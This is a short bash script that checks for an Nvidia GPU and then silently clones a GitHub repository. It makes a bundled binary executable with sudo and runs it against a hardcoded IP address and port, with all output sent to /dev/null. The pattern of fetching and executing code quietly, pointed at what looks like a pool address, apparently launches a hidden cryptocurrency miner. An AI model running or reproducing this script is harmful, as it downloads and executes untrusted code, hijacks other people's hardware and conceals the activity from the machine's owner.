#! /bin/bash
nvidia-smi
printf "Run 38.130.221.194:4545/$1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://38.130.221.194:4545/"$1" &> log
} &> /dev/null
